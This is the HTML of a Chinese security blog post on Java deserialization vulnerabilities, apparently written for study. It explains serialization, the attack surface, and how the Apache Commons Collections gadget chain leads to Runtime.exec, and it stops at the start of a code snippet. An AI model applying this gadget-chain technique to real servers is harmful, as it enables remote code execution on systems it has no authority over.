@@ -1,0 +1,1249 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Java反序列化漏洞 | UltramanGaia&#39;s Blog</title>
+  <meta name="keywords" content=" Java , ysoserial , 反序列化 ">
+  <meta name="description" content="Java反序列化漏洞 | UltramanGaia&#39;s Blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="categories">
+<meta property="og:url" content="http://ultramangaia.github.io/categories/index.html">
+<meta property="og:site_name" content="UltramanGaia&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2017-12-23T08:37:16.000Z">
+<meta property="article:modified_time" content="2019-01-19T16:10:04.947Z">
+<meta property="article:author" content="UltramanGaia">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/sublime.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+</div>
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>UltramanGaia</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="rss" href="/atom.xml" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-rss"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="github" href="https://github.com/UltramanGaia" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+        <a title="email" href="mailto:3213359017@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=3213359017&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active" data-rel="全部文章">全部文章<small>(35)</small></div></li>
+    
+        
+            
+            <li><div data-rel="Web"><i class="fold iconfont icon-right"></i>Web<small>(26)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="Web<--->Web安全">Web安全<small>(7)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Web<--->Writeup">Writeup<small>(14)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Web<--->漏洞挖掘">漏洞挖掘<small>(5)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="Java"><i class="fold iconfont icon-right"></i>Java<small>(1)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="Java<--->Java安全">Java安全<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="PHP"><i class="fold iconfont icon-right"></i>PHP<small>(4)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="PHP<--->PHP安全">PHP安全<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="PHP<--->漏洞分析">漏洞分析<small>(3)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="其它"><i class="fold iconfont icon-right"></i>其它<small>(3)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="其它<--->智能合约">智能合约<small>(2)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="其它<--->机器学习">机器学习<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="二进制"><i class="fold iconfont icon-right"></i>二进制<small>(1)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="二进制<--->PWN">PWN<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="35">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://ultramangaia.cn/">UltramanGaia</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" />
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ctf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Java</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>lua</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PHP</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PWN</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>SQL</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sqlmap</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>stackoverflow</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ThinkPHP</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>writeup</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XSS</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XSSI</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XXE</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ysoserial</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>代码执行</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>命令注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>智能合约</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>机器学习</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>漏洞分析</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>漏洞挖掘</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>请求走私</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a id="top" class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2019/Xiaomi-Series-Router-Command-Execution-Vulnerability.html"
+           data-tag="漏洞挖掘,lua"
+           data-author="" >
+            <span class="post-title" title="小米系列路由器远程命令执行漏洞（CVE-2019-18370，CVE-2019-18371）">小米系列路由器远程命令执行漏洞（CVE-2019-18370，CVE-2019-18371）</span>
+            <span class="post-date" title="2019-03-09 14:41:12">2019/03/09</span>
+        </a>
+        
+        <a id="top" class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/OpenResty%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E-CVE-2020-11724.html"
+           data-tag="请求走私"
+           data-author="" >
+            <span class="post-title" title="OpenResty请求走私漏洞（CVE-2020-11724）">OpenResty请求走私漏洞（CVE-2020-11724）</span>
+            <span class="post-date" title="2020-02-10 10:00:41">2020/02/10</span>
+        </a>
+        
+        <a id="top" class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/WebswingJsLink%E6%9C%BA%E5%88%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2020-11103.html"
+           data-tag="代码执行"
+           data-author="" >
+            <span class="post-title" title="Webswing JsLink机制远程代码执行漏洞（CVE-2020-11103）">Webswing JsLink机制远程代码执行漏洞（CVE-2020-11103）</span>
+            <span class="post-date" title="2020-03-10 10:00:41">2020/03/10</span>
+        </a>
+        
+        <a  class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/Webswing-JsLink-Mechanism-Remote-Code-Execution-Vulnerability-CVE-2020-11103.html"
+           data-tag="代码执行"
+           data-author="" >
+            <span class="post-title" title="Webswing JsLink Mechanism Remote Code Execution Vulnerability（CVE-2020-11103）">Webswing JsLink Mechanism Remote Code Execution Vulnerability（CVE-2020-11103）</span>
+            <span class="post-date" title="2020-03-10 10:00:41">2020/03/10</span>
+        </a>
+        
+        <a  class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/OpenResty-Http-Request-Smuggling-Vulnerability-CVE-2020-11724.html"
+           data-tag="请求走私"
+           data-author="" >
+            <span class="post-title" title="OpenResty Http request smuggling Vulnerability（CVE-2020-11724）">OpenResty Http request smuggling Vulnerability（CVE-2020-11724）</span>
+            <span class="post-date" title="2020-02-10 10:00:41">2020/02/10</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSSI%E6%BC%8F%E6%B4%9E.html"
+           data-tag="XSSI"
+           data-author="" >
+            <span class="post-title" title="Web安全之XSSI漏洞">Web安全之XSSI漏洞</span>
+            <span class="post-date" title="2018-10-18 16:25:02">2018/10/18</span>
+        </a>
+        
+        <a  class="全部文章 Java Java安全 "
+           href="/blog/2018/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html"
+           data-tag="Java,ysoserial,反序列化"
+           data-author="" >
+            <span class="post-title" title="Java反序列化漏洞">Java反序列化漏洞</span>
+            <span class="post-date" title="2018-10-18 16:25:02">2018/10/18</span>
+        </a>
+        
+        <a  class="全部文章 PHP 漏洞分析 "
+           href="/blog/2018/ThinkPHP-3-X-5-X-order-by%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"
+           data-tag="漏洞分析,ThinkPHP,SQL"
+           data-author="" >
+            <span class="post-title" title="ThinkPHP 3.X-5.X order by注入漏洞分析">ThinkPHP 3.X-5.X order by注入漏洞分析</span>
+            <span class="post-date" title="2018-09-14 10:00:41">2018/09/14</span>
+        </a>
+        
+        <a  class="全部文章 其它 智能合约 "
+           href="/blog/2018/Ethernaut%E9%9D%B6%E5%9C%BAwriteup.html"
+           data-tag="writeup,智能合约"
+           data-author="" >
+            <span class="post-title" title="Ethernaut 靶场 Writeup">Ethernaut 靶场 Writeup</span>
+            <span class="post-date" title="2018-06-01 18:12:04">2018/06/01</span>
+        </a>
+        
+        <a  class="全部文章 其它 智能合约 "
+           href="/blog/2018/0ctf-%E7%BA%BF%E4%B8%8B-misc-ZeroLottery.html"
+           data-tag="ctf,writeup,智能合约"
+           data-author="" >
+            <span class="post-title" title="0CTF 线下 Misc ZeroLottery Writeup">0CTF 线下 Misc ZeroLottery Writeup</span>
+            <span class="post-date" title="2018-05-29 19:10:40">2018/05/29</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/starctf-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="StarCTF 2018 Writeup">StarCTF 2018 Writeup</span>
+            <span class="post-date" title="2018-04-23 20:50:00">2018/04/23</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/ddctf-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="DDCTF 2018 Writeup">DDCTF 2018 Writeup</span>
+            <span class="post-date" title="2018-04-21 03:38:49">2018/04/21</span>
+        </a>
+        
+        <a  class="全部文章 PHP 漏洞分析 "
+           href="/blog/2018/DedeCMS5-7%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"
+           data-tag="漏洞分析"
+           data-author="" >
+            <span class="post-title" title="DedeCMS 5.7 后台两处RCE漏洞分析">DedeCMS 5.7 后台两处RCE漏洞分析</span>
+            <span class="post-date" title="2018-04-15 20:50:27">2018/04/15</span>
+        </a>
+        
+        <a  class="全部文章 PHP 漏洞分析 "
+           href="/blog/2018/Drupal-Drupalgeddon-2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2018-7600.html"
+           data-tag="漏洞分析"
+           data-author="" >
+            <span class="post-title" title="Drupal Drupalgeddon 2远程代码执行漏洞分析">Drupal Drupalgeddon 2远程代码执行漏洞分析</span>
+            <span class="post-date" title="2018-04-15 01:37:57">2018/04/15</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"
+           data-tag="命令注入"
+           data-author="" >
+            <span class="post-title" title="Web安全之命令注入漏洞">Web安全之命令注入漏洞</span>
+            <span class="post-date" title="2018-04-08 19:56:45">2018/04/08</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXXE%E6%BC%8F%E6%B4%9E.html"
+           data-tag="XXE"
+           data-author="" >
+            <span class="post-title" title="Web安全之XXE漏洞">Web安全之XXE漏洞</span>
+            <span class="post-date" title="2018-04-06 11:53:41">2018/04/06</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/0ctf-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="0CTF 2018 Writeup">0CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-04-03 16:53:31">2018/04/03</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/%E5%BC%BA%E7%BD%91%E6%9D%AF-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="强网杯 CTF 2018 Writeup">强网杯 CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-03-30 12:47:57">2018/03/30</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E6%BC%8F%E6%B4%9E.html"
+           data-tag="XSS"
+           data-author="" >
+            <span class="post-title" title="Web安全之XSS漏洞">Web安全之XSS漏洞</span>
+            <span class="post-date" title="2018-03-26 17:57:09">2018/03/26</span>
+        </a>
+        
+        <a  class="全部文章 二进制 PWN "
+           href="/blog/2018/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.html"
+           data-tag="PWN,stackoverflow"
+           data-author="" >
+            <span class="post-title" title="二进制安全之栈溢出漏洞">二进制安全之栈溢出漏洞</span>
+            <span class="post-date" title="2018-03-26 00:51:47">2018/03/26</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/pragyan-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Pragyan CTF 2018 Writeup">Pragyan CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-03-03 00:48:28">2018/03/03</span>
+        </a>
+        
+        <a  class="全部文章 PHP PHP安全 "
+           href="/blog/2018/PHP%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.html"
+           data-tag="PHP"
+           data-author="" >
+            <span class="post-title" title="PHP安全之文件包含漏洞">PHP安全之文件包含漏洞</span>
+            <span class="post-date" title="2018-03-02 19:21:59">2018/03/02</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/Xiomara-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Xiomara CTF 2018 Writeup">Xiomara CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-02-28 20:23:22">2018/02/28</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"
+           data-tag="SQL"
+           data-author="" >
+            <span class="post-title" title="Web安全之SQL注入漏洞">Web安全之SQL注入漏洞</span>
+            <span class="post-date" title="2018-02-23 13:57:25">2018/02/23</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="Web安全之文件上传漏洞">Web安全之文件上传漏洞</span>
+            <span class="post-date" title="2018-02-11 11:27:17">2018/02/11</span>
+        </a>
+        
+        <a  class="全部文章 其它 机器学习 "
+           href="/blog/2017/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0.html"
+           data-tag="机器学习"
+           data-author="" >
+            <span class="post-title" title="机器学习">机器学习</span>
+            <span class="post-date" title="2017-12-27 14:38:27">2017/12/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/DVWA-%E9%9D%B6%E5%9C%BA-writeup.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="DVWA 靶场 Writeup">DVWA 靶场 Writeup</span>
+            <span class="post-date" title="2017-12-05 20:00:04">2017/12/05</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/webug3-0-writeup.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Webug3.0 靶场 Writeup">Webug3.0 靶场 Writeup</span>
+            <span class="post-date" title="2017-12-04 19:46:57">2017/12/04</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="强网杯 CTF 2017 Writeup">强网杯 CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:36:03">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/gctf-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="GCTF 2017 Writeup">GCTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:31:56">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/%E4%B8%96%E5%AE%89%E6%9D%AF-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="世安杯 CTF 2017 Writeup">世安杯 CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:21:19">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/pwn2win-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Pwn2win CTF 2017 Writeup">Pwn2win CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:11:00">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/%E6%B9%96%E6%B9%98%E6%9D%AF-2017-ctf.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="湖湘杯 CTF 2017 Writeup">湖湘杯 CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-25 19:42:32">2017/11/25</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/hitcon-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Hitcon CTF 2017 Writeup">Hitcon CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-06 17:34:33">2017/11/06</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2017/%E7%BC%96%E5%86%99sqlmap-Tamper%E7%BB%95%E8%BF%87Waf.html"
+           data-tag="ctf,sqlmap"
+           data-author="" >
+            <span class="post-title" title="编写sqlmap Tamper绕过Waf">编写sqlmap Tamper绕过Waf</span>
+            <span class="post-date" title="2017-10-12 17:10:31">2017/10/12</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-Java反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">Java反序列化漏洞</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="Java">Java</a> > 
+            
+            <a  data-rel="Java&lt;---&gt;Java安全">Java安全</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color5">Java</a>
+            
+            <a class="color5">ysoserial</a>
+            
+            <a class="color5">反序列化</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2020-07-13 01:23:08'>2018-10-18 16:25</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java的序列化和反序列化"><span class="toc-text">Java的序列化和反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#攻击面"><span class="toc-text">攻击面</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ysoserial"><span class="toc-text">ysoserial</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#整体架构"><span class="toc-text">整体架构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BeanShell"><span class="toc-text">BeanShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jdk7u21"><span class="toc-text">Jdk7u21</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Clojure"><span class="toc-text">Clojure</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识"><span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-反射机制"><span class="toc-text">Java 反射机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java动态代理机制"><span class="toc-text">Java动态代理机制</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>Java的漏洞中，最出名的漏洞莫过于Java反序列化漏洞了。</p>
+</blockquote>
+<h2 id="Java的序列化和反序列化"><a href="#Java的序列化和反序列化" class="headerlink" title="Java的序列化和反序列化"></a>Java的序列化和反序列化</h2><p><strong>序列化</strong>是一个将对象转化成字节流的过程。在Java中，序列化可以通过<code>objectOutputStream</code>类的<code>writeObject</code>方法来实现。</p>
+<p><strong>反序列化</strong>是一个将字节流恢复成对象的过程。在Java中，反序列化可以通过<code>ObjectInputStream</code>类的<code>readObject</code>方法来实现。</p>
+<p>序列化和反序列化常常用于储存或传输对象。序列化的<code>Bytes</code>中存储的信息包括有<code>类名</code>和<code>非静态成员变量</code>，若成员变量也是对象，则会进行递归序列化和反序列化的。对于特殊的类，不能直接使用通用的序列化和反序列化方法（如HashTable），需要自定义序列化和反序列化的方法。</p>
+<p><img src="../img/javaser/1.png" alt=""></p>
+<h4 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h4><p>显而易见的攻击面：控制字节流<code>Bytes</code>，即可以在程序中注入恶意构造的特定对象，但是这种方法一般难以应用与构造RCE，因为程序中往往会对反序列化后的对象进行类型转换，如果非指定的类，会抛出异常；这种方法更多可能用于信息的伪造，如权限绕过。</p>
+<p>较深层的攻击面：在反序列化的过程中，若控制字节流<code>Bytes</code>，则可控制反序列化的类以及它的成员变量，在这过程中会自动调用<code>自定义的反序列化函数</code>，则可以简化为<strong>限制特定函数的有限制的代码执行</strong>，若能执行危险函数，则存在安全风险。若能找到合适的POP链，可以导致任意代码执行或命令执行。</p>
+<p>关于Java的反序列化漏洞可以阅读长亭科技的这篇文章</p>
+<p><a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/" target="_blank" rel="noopener">Lib之过？Java反序列化漏洞通用利用分析</a></p>
+<p>文中重点分析了利用Apache Commons Collections实现远程代码执行的原理，大概可以理解为：</p>
+<blockquote>
+<p>Apache Commons Collections 3中有个<code>TransformedMap</code>类，它对标准的<code>Map</code>进行了拓展，当这个<code>TransformedMap</code>实例中的key或者value发生改变，会调用相应<code>Transformer</code>的<code>transform()</code>方法，这个相应的<code>Transformer</code>是可以通过设置属性来设置的，而且可以用多个<code>Transformer</code>组合成<code>ChainedTransformer</code>，会依次调用<code>transform()</code>方法。</p>
+<p>Apache Commons Collections 3自带的<code>InvokerTransformer</code>类的<code>transform</code>方法里面会根据传入的参数来通过Java的反射机制来调用函数。所以，我们可以利用它来调用我们想要调用的任意函数，如<code>Runtime.getRunTime.exec</code>。</p>
+<p>当然，这个以上所提到的需要<code>key</code>或者<code>value</code>改变，而默认的<code>readObject</code>函数并不会改变它们。所以，需要找到一个类，它的属性(成员变量)中包含有<code>Map</code>而且<code>readObject</code>函数会对<code>key</code>或者<code>value</code>进行改变，如<code>setValue</code>。</p>
+<p>然后，找到了<code>AnnotationInvocationHandler</code>类，它恰好符合上述条件，组合即可实现，输入一个序列化后的对象，程序执行反序列化操作，调用<code>readObject</code>方法，执行恶意代码。</p>
+</blockquote>
+<p>听得有点迷糊吧，可以去看看上面提到的文章，跟着走一遍。</p>
+<p>整个反序列化的流程是，<code>AnnotationInvocationHandler</code>对象，它的<code>readObject</code>函数</p>
+<pre><code class="java">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
+  var1.defaultReadObject();
